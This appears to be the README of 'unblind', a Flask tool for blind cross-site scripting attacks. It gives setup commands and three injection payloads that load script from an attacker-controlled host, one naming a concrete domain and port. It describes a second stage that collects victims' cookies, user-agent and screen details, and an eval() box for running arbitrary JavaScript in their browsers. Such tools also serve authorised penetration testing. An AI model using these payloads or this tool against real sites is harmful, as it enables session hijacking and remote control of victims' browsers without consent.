
>> The tool is not beautiful neither fully functionnal. Need improvements ! Be my guest !

First, install dependencies:
```
$ pip3 install Flask
$ pip install Flask-SQLAlchemy
$ pip install flask_login
$ pip install pyopenssl
```

Then, create the database and set the environment and start the app:
```
$ python3
>>> from unblind import db, create_app
>>> db.create_all(app=create_app())
>>> exit()
$ export FLASK_APP=project
$ export FLASK_DEBUG=1
$ flask run -h 0.0.0.0 -p 5000
```

The first time you log on, you will need to create a user/password. Choose them well.

Then trigger a Blind XSS with something like:
```
"><script src='://<ip>:<port>/unblind/xss/unique_str'></script>
"><script src='http://squaredcircle.re:5000/unblind/xss/unique_str'></script>
"><img src='http://squaredcircle.re:5000/unblind/xss/unique_str'/>
```

There is a __payloads__ tab as you can see below. This tab shows basic payloads that you can __url encode__ if you'd like:

![payloads list](/images/payloads.png?raw=true "Payloads list")

Once you triggered an xss, you'd like to go to the __unblind__ tab in order to view the result as it can be shown below:

![xss](/images/xss.png?raw=true "XSS")

As you can see, there are 2 stages. The first stage is your payload. That payload, then downloads and executes the second stage.
The second stage grabs some information like the cookies, the screen resolution, the user-agent and so on.

You have the possibility to interact with the second stage. On the right of the table, there is a __textarea__ that allows you to __eval()__ a javascript command.